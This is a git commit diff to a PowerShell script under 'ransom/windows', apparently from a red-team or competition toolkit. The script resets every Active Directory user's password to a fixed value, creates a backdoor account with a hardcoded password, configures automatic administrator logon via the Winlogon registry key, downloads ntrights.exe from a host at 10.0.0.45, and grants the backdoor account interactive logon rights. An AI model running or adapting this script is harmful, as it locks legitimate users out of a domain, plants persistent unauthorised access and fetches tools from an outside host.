44c624f45618affa73bea0b697c917240d7e1aa2
6903-EthicalHacker <44905220+6903-EthicalHacker@users.noreply.github.com>
2018-11-28 18:34:39 -0800

    Update service.ps1

--- ransom/windows/service.ps1
+++ ransom/windows/service.ps1
@@ -1,8 +1,13 @@
-Get-ADUser -filter * | Set-ADAccountPassword -Reset -NewPassword(ConvertTo-SecureString "super_Secure_R!ght???" -asPlainText -Force)
-New-ADUser "NewGuest" -AccountPassword (ConvertTo-SecureString "P@ssw0rd!" -asPlainText -Force) -Enabled $True
-$RegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 $DefaultUsername = "NewGuest"
 $DefaultPassword = "P@ssw0rd!"
+$DomainName = "TEAM10"
+$DomainUser = $DomainName + "\" + $DefaultUsername
+
+curl -o C:\Windows\System32\ntrights.exe http://10.0.0.45:443/ntrights.exe
+Get-ADUser -filter * | Set-ADAccountPassword -Reset -NewPassword(ConvertTo-SecureString "super_Secure_R!ght???" -asPlainText -Force)
+New-ADUser $DefaultUsername -AccountPassword (ConvertTo-SecureString "P@ssw0rd!" -asPlainText -Force) -Enabled $True
+$RegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 Set-ItemProperty $RegPath "AutoAdminLogon" -Value "1" -type String 
 Set-ItemProperty $RegPath "DefaultUsername" -Value "$DefaultUsername" -type String 
 Set-ItemProperty $RegPath "DefaultPassword" -Value "$DefaultPassword" -type String
+ntrights.exe +r "SeInteractiveLogonRight" -u $DomainUser
